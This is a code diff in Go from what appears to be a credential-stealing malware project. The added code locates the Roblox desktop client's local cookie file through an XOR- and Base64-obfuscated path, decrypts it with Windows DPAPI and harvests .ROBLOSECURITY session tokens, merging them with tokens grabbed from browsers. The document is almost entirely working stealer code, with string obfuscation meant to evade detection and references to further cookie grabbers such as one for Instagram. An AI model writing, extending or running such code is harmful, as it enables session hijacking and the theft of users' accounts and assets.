@@ -571,8 +571,51 @@ func contains(slice []string, s string) bool {
 }
 
 func extractRobloxCookies() []string {
-	target := d("\x10\x0d\x00\x0e\x0d\x11\x07\x01\x17\x10\x0b\x16\x1b")           // ROBLOSECURITY XOR 0x42
-	return ultimateGrabber(d("\x30\x2d\x20\x2e\x2d\x3a\x6c\x21\x2d\x2f"), target) // roblox.com XOR 0x42
+	results := extractRobloxCookiesFromDat()
+	target := d("\x10\x0d\x00\x0e\x0d\x11\x07\x01\x17\x10\x0b\x16\x1b")                      // ROBLOSECURITY XOR 0x42
+	browserCookies := ultimateGrabber(d("\x30\x2d\x20\x2e\x2d\x3a\x6c\x21\x2d\x2f"), target) // roblox.com XOR 0x42
+
+	for _, c := range browserCookies {
+		if !contains(results, c) {
+			results = append(results, c)
+		}
+	}
+	return results
+}
+
+func extractRobloxCookiesFromDat() []string {
+	var results []string
+	home, _ := os.UserHomeDir()
+	// Obfuscated path: AppData\Local\Roblox\LocalStorage\RobloxCookies.dat
+	// "AppData\Local\Roblox\LocalStorage\RobloxCookies.dat" XOR 0x50 -> Base64
+	p := d("ESAgFDEkMQwcPzMxPAwCPzI8PygMHD8zMTwDJD8iMTc1DAI/Mjw/KBM/Pzs5NSN+NDEk")
+	path := filepath.Join(home, p)
+
+	if _, err := os.Stat(path); err != nil {
+		return results
+	}
+
+	data, err := os.ReadFile(path)
+	if err != nil {
+		return results
+	}
+
+	if len(data) == 0 {
+		return results
+	}
+
+	decrypted, err := decryptDPAPI(data)
+	if err == nil {
+		cookieStr := string(decrypted)
+		// Roblox cookies usually start with _|WARNING:-DO-NOT-SHARE-
+		if strings.Contains(cookieStr, "_|WARNING") {
+			results = append(results, cookieStr)
+		} else if len(cookieStr) > 100 {
+			// Some versions might not have the warning but are still valid tokens
+			results = append(results, cookieStr)
+		}
+	}
+	return results
 }
 
 func extractInstagramCookies() []string {
